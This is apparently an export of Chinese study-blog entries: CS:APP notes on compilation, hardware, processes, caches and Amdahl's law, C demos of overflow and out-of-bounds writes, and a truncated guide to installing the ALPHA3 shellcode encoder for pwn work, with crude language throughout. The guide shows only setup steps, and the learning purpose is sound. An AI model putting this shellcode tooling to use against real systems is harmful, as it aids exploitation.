[{"title":"01-A Tour of Computer Systems-计算机系统漫游","url":"//docx/01-A Tour of Computer Systems-计算机系统漫游/","content":"计算机系统由硬件和系统软件组成，他们共同工作，但是具体的实现方式随着时间不停变化。不过系统的内在概念没有改变。我们可以通过理解软硬件的相互工作，深入理解来明白这些组件是如何影响程序的正确性和性能。不过这一切的一切我们大抵都要从我们的HelloWorld开始。byd兜兜转转还是回到了HelloWorld对吗？\n\n好的，先让我们找个傻逼代码：\n\n```c\n#include<stdio.h>\n\nint main()\n{\n    printf(\"hello, world\\n\");\n    return 0;\n}\n```\n\n# 1.1 信息 = 位 + 上下文\nhelloword程序的生命周期是从一个源文件开始的。程序员通过编写文件《hello.c》——一堆由0和1组成的位序列，8个组成一组，成为字节。由字节来表示程序中的大部分文本字符。\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_0.png)\n\n啥？详细的表示你去看ASCII就好了，这个应该只要学过计算机都知道。像这样用ASCII码组成的文件都叫做**文本文件**，其他的我们统称为**二进制文件**\n\n```plain\n为什么用C语言呢？因为C语言是一个与Unix内核相关的语言，大部分操作系统的核心都是Unix，而C语言一开始只是为了Unix系统而开发出来的程序语言。因此保留了C语言的第一个特性：移植性。\nC语言非常简单，因为它是由一个人掌控的而并非一个协会。所以这个语言简洁明了，没有什么多余的设计。\nC语言因为是为了Unix系统而开发的语言，其实他作为一个老东西，是系统级编程的首选（因为它可以写很多底层的东西），再者，其实用它来开发什么程序也完全不会差。不过傻逼学不明白，很显然的一点，因为他保留了底层最关键的东西：指针——一个让人需要理解大量抽象知识才能完全掌握的东西。\nC语言为数不多的缺点是其实他没有什么抽象的显式支持，例如类、对象、异常等等。于是C++和Java就横空出世了。\n```\n\n这个文件其实告诉了我们计算机一个最基础的思想：系统中所有的信息：磁盘文件，程序，内存还是网络上传输的数据都是由一串bits组成的，不同的上下文中，同样的一串bits可以是整数、浮点数、字符串、亦或者是什么机器指令。这也组成了各种我们能遇见的奇怪事情：也就是同样的数据也许会以不同的方式表示。\n\n# 1.2 程序被其他程序翻译成不同的格式\n为什么C语言是文本文件？当然因为这种格式可以让人看懂，接下来我们要让计算机看懂了。为了在系统上运行，我们需要把所有的C语言语句转化成一条条低级机器语言指令，然后把这些指令按照一种称为_可执行目标程序_的格式打包好后，以二进制的形式存放起来。目标程序也被叫做——可执行目标文件。\n\n比如在Unix（这边我们拿ubuntu做实验环境）\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_1.png)\n\n我们用GCC编译器驱动程序来读取hello.c，并且把它编译成一个可执行的“hello”文件。这是一个翻译过程，具体如下：\n\n![画板](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_2.png)\n\n在cpp，ccl，as，ld（C preprocessor - C预处理器、Clang Compiler Frontend - Clang编译器、Assembler汇编器、Linker链接器）这四项组合后，就构成了编译系统（Compilation system）。其中：\n\n**预处理阶段：**cpp根据以字符#开头的命令，修改原始的C语言程序，把这些文件全部插入到程序文本中。结果就得到了另一个C程序，我们一般以`.i`作为文件扩展名。\n\n**编译阶段：**ccl将文本文件hello.i翻译成hello.s，这个文件由C语言文件变成了_汇编语言程序_，该程序包含我们对main的定义：\n\n```plain\nmain:\n  sub\t\trsp, 8\n  mov\t\tedi, str\n  call\tputs\n  mov\t\teax, 0\n  add\t\trsp, 8\n  ret\n```\n\n汇编语言的一大好处就是，他统一了一个软件系统的所有汇编指令，不同语言写法用法和功能侧重点都不同，不过经过编译之后都变成了一样的汇编指令。然后我们可以通过汇编指令进行汇编操作。\n\n**汇编：**接下里，汇编器as会把hello.s翻译成机器语言指令，这些指令打包成一种叫做_可重定位目标程序（relocatable object program）_，结果是一个二进制程序保存在hello.o中。他将包含main的指令编码。直接打开将是一串乱码。\n\n**链接：**因为我们在hello.c中使用了printf这个函数，这个是C语言编译器提供的`stdio.h`标准库中的一个函数。而这个`stdio.h`如果要找到printf，就需要找到`printf.o`这个文件，这个文件必须以某种方式存在在我们最终的目标程序上，链接就是干这一步的。如此这般，就可以得到最终的_可执行目标程序（可执行文件Executable program）_，这样就可以被加载到内存中，由系统执行了。\n\n```plain\nGCC是GNU（GNU's Not Unix）项目开发出来的工具之一。至于为什么叫做这个名字，是因为GNU是一个包含Unix系统的类Unix系统，目的是为了开源让所有人都可以不受限制的修改其源代码。不过内核除外，因为内核是由Linux项目独立开发出来的。\nGNU取得了非常非凡的成绩，拥有众多编译器和编译环境，能够为不同的机器生成不同的代码。Linux系统的成功，GNU是功不可没的。\nLinux系统是模仿Unix系统做的类Unix系统，因为Unix系统是要钱的（商业软件）。再者，Unix可以选择不同的内核（kernel），而Linux一般只有一个内核。而MacOS是基于Unix的，虽然一开始他的名字叫做XNU（X's Not Unix），其中MacOS的XNU内核，是Mach+BSD，而BSD就是从Unix继承下来的一个内核。\n```\n\n# 1.3 知道这些玩意有啥用\n其中很大的一个作用就是，作为一个程序员，我们可以通过这个编译系统如何工作的流程了解到很多信息：\n\n**1、优化程序性能：**我们可以通过大量的调试来了解一些东西：switch是否总是比ifelse更加高效，for和while谁才是爹，一个函数调用时候的开销有多大？指针比数组优秀吗……很多很多的问题都可以通过这样的方式理解。\n\n**2、理解链接时候出现的错误：**各种静态库和动态库的问题都可以通过理解链接这一步骤理解完毕。想想看，当你用vs辛辛苦苦写出来一个程序想要炫耀的时候，如果不是release版本而是debug版本发给别人的话，那么别人就会报一堆链接错误。亦或者是自己写程序的时候也会出现这样那样的错误。\n\n**3、避免安全漏洞：**这是我学CSAPP很大的一部分原因，这个流程既可以了解到如何保护程序，也可以破解程序。几乎所有的安全漏洞都是缓冲区溢出之类的问题。\n\n# 1.4 处理器 读取并解释 储存在内存中的 指令\n现在，我们已经得到一个hello文件了，可以通过linux自带的shell工具打开。是的，也就是命令行可以直接打开：\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_3.png)\n\n## 1.4.1 系统的硬件组成\n为了理解我们运行hello的时候到底发生了什么，我们需要理解一系列硬件组织。就拿Intel芯片举例吧：\n\n![画板](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_4.png)\n\n这张图看起来很简单，其实很复杂。接下来我会慢慢解释，先简单讲一下：\n\n**1、总线：**贯穿整个系统的电子管道。他携带的信息字节负责在各个部件之间进行传输。总线被设计成传输固定的字节块，也就是_字（word）_。字中的字节数是一个基本的系统参数，每个系统中都不一样。32位的系统和64位的系统应运而生，分别为4个字节或者8个字节。\n\n**2、I/O设备：**图中的USB控制器，图形适配器还有磁盘控制器等等都是IO设备中的一环。我们制作的hello.c程序就是存在磁盘中的。每一个外部设备（IO设备）都会通过一个控制器或者适配器与总线进行连接，进行数据传输。\n\n控制器和适配器之间的区别在于他们的封装方式。控制器是IO设备本身或者系统的主印制电路板（也就是主板）上的芯片组，而适配器则是一块插在主板上插槽的卡。不过他们的功能是一样的：在IO总线和IO设备之间传输数据。\n\n**3、主存：**主存是一个零食存储设备，用来放程序和程序处理的数据（在程序被处理器处理（执行）的时候），从物理上来说存储器是由一组_动态随机存取存储器（DRAM）_的芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址都是从0开始的。一般而言，组成程序的每条机器指令又都不同的数量的字节构成。其实大部分时候这一块我们会直接叫做内存。\n\n与C程序的变量相对应的数据项的大小是更具类型变化的。比如在运行Linux的X86_64系统上，short需要2个字节，而int和float需要4个字节，long和double需要8个字节。\n\n**4、处理器：**中央处理单元（CPU），也就是处理器，是解释或执行存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（也就是寄存器），称为_程序计数器（PC）_，在任何时刻，PC都是只想主存中某条机器语言指令的（含有该指令的地址）。\n\n从系统通电开始，直到系统断电。整个过程中处理器会不停的执行程序计数器指向的指令，再更新程序计数器——指向下一条指令。处理器看上去是按照一个非常简单的指令执行模型来操作的，这个模型是由_指令集架构_所决定的。在这个模型中，指令按照严格的顺序执行，执行一条指令中包含一系列的步骤。\n\n处理器从程序计数器指向的内存中的包含所需指令的地址，解释指令中的位，执行指令中的操作，然后更新PC使其执行下一条包含指令的地址。这条指令并不再内存中刚刚执行的指令相邻。\n\n这样的简单操作并不会太多，他们围绕着主存，寄存器文件和算数/逻辑单元进行。寄存器就是一个超级小超级快的内存，由单一的字长组成。每个寄存器都有一个他的名字。ALU计算新的数据和地址值。CPU在指令的要求下可能会执行这些操作：加载、储存、操作和跳转。我们会在讲寄存器的时候详细的讲解。\n\n处理器看上去是他的指令集架构的简单实现，但是实际上现代的处理器使用了非常复杂的机制来加速程序的执行。\n\n## 1.4.2 运行hello程序\n这一块我们直接简单的讲解一下理解一下就好。\n\n1、USB获取键盘数据（输入./shell 回车)，将数据通过IO总线发送给IO桥，IO桥将数据发送到主存储器中，并且把这条“打开程序”指令发送给CPU进行梳理。再CPU中，数据通过系统总线传到总线接口，发送给寄存器。\n\n2、这一系列指令将hello目标文件中的代码和数据从磁盘直接进行复制发送到主存。\n\n3、将代码发送给寄存器文件进行处理，寄存器指向了内存中的文件命令地址，然后和CPU做运算逻辑处理。把处理之后的数据发送给图形适配器，发送给显示器显示“hello，world\\n”\n\n# 1.5 高速缓存\n这个实例最明显的一点就是，我们发现大部分时候计算机系统就是把一部分数据复制到另外一个地方上。每一笔赋值操作都是时间开销，减缓了程序真正的工作。\n\n为了处理这个速度问题（主要是又快又大的主存开销很大，所以必须要有外存的存在），系统设计者采用了更小更快的存储设备，被叫做_高速缓存存储器（cache memory，一般简称cache）_，作为暂时的集结区域。存放CPU近期可能会需要的信息。\n\n位于处理器上的L1高速缓存容量可以达到数万字节，其速度几乎和访问寄存器一样快，随后是一个更大的L2高速缓存器，拥有数百万的存储空间，其代价是速度是L1高速缓存的5倍。最新的处理器也许还会有一个L3高速缓存器。\n\n# 1.6 存储器设备形成层次结构\n如此这般，组成了一个存储器层次结构：\n\n![画板](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_5.png)\n\n# 1.7 操作系统 管理硬件\n当我们回到hello程序的例子，当shell加载和运行hello程序的时候，以及hello程序输出自己的消息的时候，shell和hello都没有直接访问键盘显示器磁盘等空间，而是通过_操作系统_来进行服务，操作系统就是应用程序和软件程序之间插入的一层软件。所有的系统程序对硬件的操作都必须通过操作系统。\n\n![画板](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_6.png)\n\n操作系统有两个操作：1是防止硬件被失控的程序滥用，2是向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过几个基本的抽象概念（进程，虚拟内存，文件）来实现这两个功能：\n\n![画板](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_7.png)\n\n文件是对IO设备抽象地表示，虚拟内存是对主存和磁盘IO空间的抽象表示，进程则是对处理器，主存和IO设备的抽象表示。\n\n```plain\n20 世纪 60 年代大型复杂操作系统盛行，如 IBM OS/360（成功项目）、Honeywell Multics（未广泛应用 ）。贝尔实验室因 Multics 复杂、进展慢，1969 年 Ken Thompson 等基于 DEC PDP - 7，用机器语言开发更简单系统，思想源于 Multics（如层次文件系统、shell 概念 ）。1970 年 Brian Kernighan 命名 “Unix”（双关暗指 Multics 复杂 ），1973 年用 C 重写内核，1974 年正式发布 。\n贝尔实验室向学校慷慨开放源代码，Unix 在高校获支持发展。20 世纪 70 年代末 - 80 年代初，加州大学伯克利分校推出含虚拟内存、Internet 协议的 4.xBSD；贝尔实验室发布 System V Unix 。Sun 等厂商的 Solaris 等系统，从 BSD、System V 衍生 。\n20 世纪 80 年代中期，Unix 厂商为差异化加不兼容特性致麻烦。IEEE 推动标准化，Richard Stallman 命名为 “Posix”，涵盖系统调用 C 接口、shell、线程、网络编程等标准 。后续 “标准 Unix 规范” 与 Posix 统一标准，Unix 版本差异基本消失 。\n```\n\n## <font style=\"color:rgba(0, 0, 0, 0.85) !important;\">1.7.1 进程</font>\n我们会发现，像是hello这样的程序在现代系统上运行的时候，操作系统会提供一种假象：就好像系统上就只有这个程序在运行。程序看上去只是独占的使用处理器、主存和IO设备。似乎只是不间断的一条一条的执行当前程序的指令。\n\n实际上，这些假象都是通过“_进程_”这个概念来实现的。进程是操作系统中对一个正在运行的程序的一种抽象。它可以让我们觉得一个系统上运行着好多的进程且每个进程都在独占地使用硬件。\n\n而这个则是_并发运行，_就是一个进程的指令和另外一个进程的指令是操作执行的。在大多数系统中，需要运行的进程数是多余可以运行他们的CPU个数的，传统系统中在一个时刻只能执行一个进程，而现代多核处理器则可以一个时刻处理多个进程。为了简化学习过程接下来是以传统系统来讲解。\n\n操作系统首先会对每一个进程运行所需的状态信息进行跟踪和保存。这种状态也就是_上下文_，包括许多信息，例如PC的位置，寄存器的值，主存的内容等等。在任何一个时刻，单处理器都只能执行一个进程的代码。当操作系统决定要把控制权从当前进程转移到另外一个进程的时候，则会进行“_上下文切换_”——及保存当前进程的上下文，恢复另一个进程的上下文，然后将控制权传递给第二个进程（后面叫做新进程），新进程获取控制权后，就会从他上次停止的地方开始继续运行。如下图所示：\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_8.png)\n\n实现进程这个抽象，需要底层硬件系统和操作系统软件的紧密合作。\n\n## 1.7.2 线程\n除了进程，还有线程这个概念。尽管通常我们认为一个进程只有一个单一的控制流，但是在现代系统上，一个进程实际上可以有多个称之为线程的执行单元组成。例如java中的tread、runnable这些。每个线程都运行在进程的上下文中，并且共享同样的进程中的代码和全局数据。这是因为网络服务器中对于并行处理的需求，线程成为越来越重要的编程模块了。当有多处理器可用的时候，多线程也成为了一个可以让程序运行的更快的办法之一。\n\n## 1.7.3 虚拟内存\n虚拟内存是一个抽象概念，属于是进程之下的一个抽象概念——即每个进程都在独占地使用主存。每个进程看到的虚拟内存空间几乎无异，把这个叫做_虚拟地址空间_。在linux或unix、类unix系统中虚拟内存布局如下所示：\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_9.png)\n\n这里的内容我懒得赘述，可以去查看：[pwn及计算机原理基础知识](/docx/pwn%E5%8F%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8E%9F%E7%90%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/)\n\n不过较后面的笔记会详细解释里面的东西。\n\n虚拟内存的运作需要硬件和操作系统软件之间精密复杂的交互，包括对处理器生成的每个地址的硬件解释等。核心就是把一个进程的虚拟内存的内容保存在磁盘上，然后用主存作为磁盘的高速缓存。\n\n## 1.7.4 文件\n文件就是字节序列。在linux系统中被称作“一切皆文件”。磁盘、键盘、显示器、网络这些IO设备都可以看作是文件。系统中的所有输入输出都是通过使用一小组称为UnixIO的系统函数调用读写文件来实现的。\n\n其实文件这个抽象概念是很强大的，因为把一切东西都用了一种统一的视图来查阅，因为把一切都抽象成一串可以供处理磁盘文件的应用程序员进行处理的内容。不然的话在不同的磁盘技术上，就要学习不同的磁盘数据保存方法。\n\n```plain\nLinux小故事：\n1991 年 8 月，芬兰研究生 Linus Torvalds 谨慎地发布了一个新的类 Unix 的操作系统内核，内容如下。\n来自：torvalds@klaava.Helsinki.FI (Linus Benedict Torvalds)\n新闻组：comp.os.minix\n主题：在 minix 中你最想看到什么？\n摘要：关于我的新操作系统的小调查\n时间：1991 年 8 月 25 日 20:57:08 GMT\n    每个使用 minix 的朋友，你们好。\n    我正在做一个（免费的）用在 386（486）AT 上的操作系统（只是业余爱好，它不会像 GNU 那样庞大和专业）。这个想法自 4 月份就开始酝酿，现在快要完成了。我希望得到各位对 minix 的任何反馈意见，因为我的操作系统在某些方面与它相类似（其中包括相同的文件系统的物理设计（因为某些实际的原因））。\n    我现在已经移植了 bash（1.08）和 gcc（1.40），并且看上去能运行。这意味着我需要几个月的时间来让它变得更实用一些，并且，我想要知道大多数人想要什么特性。欢迎任何建议，但是我无法保证我能实现它们。:-)\n    Linus（torvalds@kruuna.helsinki.fi）\n就像 Torvalds 所说的，他创建 Linux 的起点是 Minix，由 Andrew S.Tanenbaum 出于教育目的开发的一个操作系统 。\n接下来，如他们所说，这就成了历史。Linux 逐渐发展成为一个技术和文化现象。通过和 GNU 项目的力量结合，Linux 项目发展成了一个完整的、符合 Posix 标准的 Unix 操作系统的版本，包括内核和所有支撑的基础设施。从手持设备到大型计算机，Linux 在范围如此广泛的计算机上得到了应用。IBM 的一个工作组甚至把 Linux 移植到了一块腕表中！\n```\n\n# 1.8 系统之间利用网络通信\n我们一般而言把计算机系统作为一个孤立的硬件和软件的结合体。实际上现代的系统经常通过网络和希塔设备连接到一起。于是我们多了一个IO设备——网络适配器。\n\n当系统从主存中复制一串字节到网络适配器的时候，数据流经过网络到达另一台机器，而不是本地的磁盘驱动器。相似的，系统可以读取从其他机器发过来的数据，并且把别的机器的数据放在自己的主存上。随着Internet这样的全球网络的出现，从一台主机复制信息到另外一台主机已经成为了计算机系统最重要的用途之一。\n\n于是乎，我们也可以像在本地用./hello打开HelloWorld程序，也可以在远程的服务器上干这个事情。用一个熟悉的telnet应用连接上远程的telnet服务器等...\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_10.png)\n\n# 1.9 重要主题\n这个是本章的小结部分了。我们得到了一个重要的观点那就是系统不仅仅是硬件，系统是软硬件结合互相交织的艺术品。他们必须共同协作才能达到运行应用程序的最终目的。\n\n作为本章的结束，最后再强调几个贯穿计算机系统所有方面的重要概念。\n\n## 1.9.1 Amdahl定律\nGene Amdahl对提升系统某一部分性能所带来的效果做出了简单却有见地的观察。这就是_Amdahl定律_。这玩意到底干了什么呢——他的意思是，当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速成都。\n\n例如，\n\n某系统执行某应用所需要的时间为$ {T}_{old} $\n\n假设系统某部分所需执行时间与该事件的比例为$ \\alpha $\n\n而该部分的性能提升比例为$ k $\n\n即该部分初始所需时间为$ {\\alpha}T_{old} $。现在所需要的时间则为$ ({\\alpha}{T}_{old})/{K} $。因此，总的时间则为：\n\n$ T_{\\text{new}} = (1-\\alpha)T_{\\text{old}} + \\frac{\\alpha T_{\\text{old}}}{k} = T_{\\text{old}} \\left[ (1-\\alpha) + \\frac{\\alpha}{k} \\right]$\n\n因此，可以计算加速比为$ S=T_{old}/T_{new} $为\n\n$ S=\\frac{1}{(1-\\alpha)+\\alpha/k} $\n\n举个例子，系统的某个部分初始耗时为60%，其加速比例因子为3。那么我们就可以计算得出加速比为`1/[0.4+0.6/3]=1.67`倍。虽然我们加速了系统中某一个主要的部分做出了重大的改经。但是非常可惜的是系统的加速效率小于这个部分本来应该做到的加速速度。——所以要加速整个系统，就必须把系统中绝大部分的设备速度全部提升上来。\n\n那么就由小朋友要问了：这他妈是啥啊……（其实很简单但是我代数基础非常差只能上分析了）\n\n说实话哈，我也没看明白这里面的关联。不过非常有趣的是因为我薄弱的数学基础和大学期间突然苦练的高数。我倒是可以用导数和极限来处理一下：\n\n$\\lim_{k \\to \\infty} S = \\lim_{k \\to \\infty} \\frac{1}{(1 - \\alpha) + \\frac{\\alpha}{k}} = \\frac{1}{1 - \\alpha}$\n\n当加速倍数K变化的时候（逐渐变大），S也会越来越大，符合我们的直觉：加速某一部分，整体加速。不过还有一个$ 1-\\alpha $的部分是永恒不变的。这就用到导数了（我的妈啊，高数害死我了）：\n\n$ S = \\frac{1}{(1 - \\alpha) + \\alpha k^{-1}}\n $\n\n$ f(k) = (1 - \\alpha) + \\alpha k^{-1} $\n\n$ \\frac{dS}{dk} = \\frac{\\alpha}{k^2 \\cdot \\left[(1 - \\alpha) + \\frac{\\alpha}{k}\\right]^2} $\n\n用导数来分析其实就很明显了，这边会计算出一个“加速变化率”，当我的k越来越大的时候，很明显的是整个加速效率会变低——即 k 越大，增加 k 对 S 的提升效果越弱（边际效益递减）。反之要加速整个系统，就必须把系统中绝大部分的设备速度都全部提升上来。\n\n有两道例题：\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_11.png)\n\n虽然我代数差，这个应该算给小学生做的。还是很简单的。不过写完题目之后看到里面与预料相差较大的值，也能直观的领悟到这个公式的含义。\n\n## 1.9.2 并发和并行\n数字计算机的整个历史中，有两个需求是驱动进步的持续动力：一个是我们想要计算机做的更多，另一个是我们想要计算机做的更快。当计算机能够同时做更多事情的时候，这两个因素都会改进。\n\n我们用术语_并发concurrency_来指代一个同时具有多个活动的系统。\n\n我们用术语_并行parallelism_来指代用并发来让一个系统运行的更快。\n\n并行可以在计算机系统的多个抽象层次上运用：\n\n1. 线程级并发\n\n构建在进程这个抽象之上，我们能设计出可以同时多程序执行的系统。这就导致了并发的出现。传统意义上，这种并发执行是模拟出来的假象。在单处理器系统中，处理器必须在多个任务之间切换，大多数实际的计算也都是由一个处理器来完成的。\n\n当构建一个由但操作系统内核控制的多处理器组成的系统时候，我们就得到了一个多处理器系统。随着现在多核处理器和_超线程hyperthreading_的出现，这种系统就越来越常见了。\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_12.png)\n\n多核处理器时将多个CPU（叫做核）集成到一个集成电路芯片上。如下图所示：\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_13.png)\n\n这是一个典型的多核处理器的组织架构。其中微处理器芯片有四个cpu核，每个核都有自己的L1和L2高速缓存，其中L1高速缓存分为数据和指令的高速缓存。\n\n超线程，有时候称作_同时多线程simultaneous multi-threading_，是一个允许一个CPU执行多个控制流的技术。这种CPU有多个备份例如PC和寄存器，而其它的硬件部分只有一份例如做浮点算术运算的单元。这样的CPU可以更好地利用他的处理资源——在单个周期的基础上决定要执行哪一个线程。比如：一个线程必须等到某些数据被加载到高速缓存中，那么CPU就可以去执行另外一个线程。例如Intel Core i7可以同时让每个核执行两个线程，那么4核系统就可以并行8个线程。\n\n现在的人们突然发现为什么我们不用CPU的这个特性来写程序呢？如此这般多线程也就出现了，它是一种真正的可以算作实现了“并发”的“并行”技术。\n\n2. 指令级并行\n\n在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称之为_指令集并行_。\n\n如果处理器可以达到比一个周期一条指令更快的速度，那么就是_超标量superscalar_处理器。以前不行，不过现代的大部分处理器都支持超标量操作。我们依旧可以对这个进行理解，提升代码效率。\n\n3. 单指令、多数据并行\n\n在最低层次上，许多现代处理器拥有特殊的硬件——允许一条指令产生多个可以并行执行的操作，这种方式叫做单指令、多数据。即为SIMD并行。例如，比较新的Intel和AMD处理器都可以并行处理8对单精度浮点数做加法的指令。\n\n提供这些SIMD指令大多是为了提高处理多媒体数据应用的执行速度。虽然有些编译器会试图从C程序中抽取SIMD并行性，但是更可靠的方法是用编译器支持的特殊的向量数据类型来写程序。\n\n## 1.9.3 计算机系统中抽象的重要性\n抽象的使用时计算机学科中最为重要的改练至一。例如，为一组函数规定一个简单的应用接口API就是一个很好的编程习惯。程序员无需了解内部的工作原理便可以直接使用。不同的编程语言提供不同形式和等级的抽象，例如java的类和c语言的函数原型。\n\n我们在之前已经讲过抽象了，现在我们在最外面套一个虚拟机——因为一些时候我们需要一个计算机上跑好几个不同的系统或者同一个系统的不同版本。虚拟机就此提供了对整个计算机系统的抽象。\n\n![](/img/filesimg/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游/01-A%20Tour%20of%20Computer%20Systems-计算机系统漫游_14.png)\n\n而在后续，我们要把这些隐藏复杂性的“抽象们”全部都拆开来研究到底有“多复杂”了。\n\n# 1.10 小结\n计算机系统是由硬件和系统软件组成的，它们共同协作以运行应用程序。计算机内部的信息被表示为一组组的位，它们依据上下文有不同的解释方式。程序被其他程序翻译成不同的形式，开始时是 ASCII 文本，然后被编译器和链接器翻译成二进制可执行文件。\n\n处理器读取并解释存放在主存里的二进制指令。因为计算机花费了大量的时间在内存、I/O 设备和 CPU 寄存器之间复制数据，所以将系统中的存储设备划分成层次结构 ——CPU 寄存器在顶部，接着是多层的硬件高速缓存存储器、DRAM 主存和磁盘存储器。在层次模型中，位于更高层的存储设备比低层的存储设备要更快，单位比特造价也更高。层次结构中较高层次的存储设备可以作为较低层次设备的高速缓存。通过理解和运用这种存储层次结构的知识，程序员可以优化 C 程序的性能。\n\n操作系统内核是应用程序和硬件之间的媒介。它提供三个基本的抽象：\n\n1) 文件是对 I/O 设备的抽象；\n\n2) 虚拟内存是对主存和磁盘的抽象；\n\n3) 进程是处理器、主存和 I/O 设备的抽象。\n\n最后，网络提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种 I/O 设备。\n\n","tags":["计算机原理"],"categories":["CSAPP - 深入了解计算机系统"]},{"title":"00-Preface-导读","url":"//docx/00-Preface-导读/","content":"本笔记基于CS:APP3e，也就是Computer Systems: A programmer's Perspective。\n\n作为一名优秀的程序员，或者说要成为上个时代所谓真正名义上的“黑客”。这本书大约是必不可跳过的经典。\n\n这本书的目的是让阅读者更好的理解什么是计算机，就这么简单。或这本书的直译是《程序员的角度理解计算机系统》。也就是为大部分软件开发者准备的。不过所有的笔记都是以我当前的视角来记录的。可能没有那么好理解。记录这个笔记也是为了让自己可以快速复习。相当于外置大脑了。\n\n我看的书都是从第一张开始的，不过网上会有一些公开课之类的东西。在里面举了一些例子。对于现在的我而言是知道一些浅显的原因却不知道原理。例如用GDB执行几个简单的运算：\n\n![](/img/filesimg/00-Preface-导读/00-Preface-导读_0.png)\n\n稍微学过C的都知道，int类型会有一个范围，大概是-2^32~2^32这么一个范围，如果超出之后就会出现错误。其原理是：\n\n![](/img/filesimg/00-Preface-导读/00-Preface-导读_1.png)\n\n当数据是这样的时候，如果再+1则会变成-1.\n\n![](/img/filesimg/00-Preface-导读/00-Preface-导读_2.png)\n\n本质上是系统或者说编译的时候对数值的处理上与人类的理解有所偏差。\n\n还有一些有趣的C语言程序：\n\n```c\n#include <stdio.h>\n#include <time.h>\n\nint src[2048][2048] = {0};\nint dst1[2048][2048] = {0};\nint dst2[2048][2048] = {0};\n\nvoid copyij(int src[2048][2048], int dst[2048][2048]) {\n    for (int i = 0; i < 2048; i++) {\n        for (int j = 0; j < 2048; j++) {\n            dst[i][j] = src[i][j];\n        }\n    }\n}\n\nvoid copyji(int src[2048][2048], int dst[2048][2048]) {\n    for (int j = 0; j < 2048; j++) {\n        for (int i = 0; i < 2048; i++) {\n            dst[i][j] = src[i][j];\n        }\n    }\n}\n\nint main() {\n    clock_t start, end;\n    double time_ij, time_ji;\n\n    start = clock();\n    copyij(src, dst1);\n    end = clock();\n    printf(\"copyij 运行时间: %.2f 毫秒\\n\", ((double) (end - start)) / CLOCKS_PER_SEC * 1000);\n    \n    start = clock();\n    copyji(src, dst2);\n    end = clock();\n    printf(\"copyji 运行时间: %.2f 毫秒\\n\", ((double) (end - start)) / CLOCKS_PER_SEC * 1000);\n\n    return 0;\n}\n```\n\n![](/img/filesimg/00-Preface-导读/00-Preface-导读_3.png)\n\n会发现两种遍历交换的方式时间上相差至少两倍。\n\n还有像是struct的问题：\n\n```c\n#include <stdio.h>\n\ntypedef struct {\n    int a[2];\n    double d;\n} struct_t;\n\ndouble fun(int i) {\n    volatile struct_t s; \n    s.d = 3.14;\n    s.a[i] = 1073741824; \n    return s.d;\n}\n\nint main() {\n    for(int i=0;1;i++)\n        printf(\"i=%d 时返回值：%lf\\n\", i, fun(i));\n    return 0;\n}\n```\n\n![](/img/filesimg/00-Preface-导读/00-Preface-导读_4.png)\n\n返回值出现错误的同时，程序会报错停止运行。\n\n而学习csapp的目的就是，可以彻底的从软硬件，操作系统以及内存上去理解相关的东西。\n\n","tags":["计算机原理"],"categories":["CSAPP - 深入了解计算机系统"]},{"title":"shellcode - alpha3.py","url":"//docx/shellcode - alpha3.py/","content":"# 下载ALPHA3\nALPHA3实际上只是配windows，不过有国人制作了适配linux版本的。因为我的环境大多数都是在linux上，所以我直接下载国人修改制作的适配linux版本的ALPHA3：（我也只写了linux教程）\n\n```c\ngit clone https://github.com/TaQini/alpha3.git\n```\n\n我把这个py脚本git到了我的~/Software文件夹下。\n\n![](/img/filesimg/shellcode%20-%20alpha3.py/shellcode%20-%20alpha3.py_0.png)\n\n直接运行会报错。我是真不理解这是什么错误。上网找了一些教程，最终发现感觉这个文件只支持python2运行。\n\n那么我就要在我的ubuntu里面安装一个python2环境，还要和python3环境兼容\n\n[python2环境](/docx/python2%E7%8E%AF%E5%A2%83/)\n\n这个时候，我们可以用python2来运行程序了。\n\n![](/img/filesimg/shellcode%20-%20alpha3.py/shellcode%20-%20alpha3.py_1.png)\n\n# 使用\n用起来太麻烦了，每次都要进入这个傻逼目录里面他妈的调用这个傻逼脚本的话，太他妈的麻烦了。我决定创造一个链接，让我可以无时无刻用。\n\n为此我要创建一个叫做.links的隐藏文件夹在我的用户目录下，然后往里面塞链接。\n\n```python\nmkdir ~/.links\nsudo ln -s 